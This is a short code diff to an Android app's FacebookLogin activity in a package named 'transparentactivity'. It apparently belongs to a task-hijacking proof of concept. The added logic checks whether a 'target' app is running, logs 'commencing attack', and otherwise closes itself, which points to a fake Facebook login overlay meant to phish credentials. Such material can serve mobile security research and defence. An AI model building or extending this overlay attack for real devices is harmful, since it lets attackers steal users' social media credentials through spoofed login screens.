@@ -3,6 +3,7 @@ package com.example.transparentactivity;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.Toast;
 
@@ -15,7 +16,20 @@ public class FacebookLogin extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_facebook_login);
         Objects.requireNonNull(getSupportActionBar()).setDisplayShowTitleEnabled(false);
-        moveTaskToBack(true);
+        if (getSupportActionBar() != null) {
+            getSupportActionBar().hide();
+        }
+
+        if (isTaskRoot()) {
+            Log.i(MainActivity.TAG, "Target not running... closing activity");
+            moveTaskToBack(false);
+            finish();
+        }
+
+        else {
+            Log.i(MainActivity.TAG, "Target running... commencing attack");
+            moveTaskToBack(true);
+        }
     }
 
     @Override
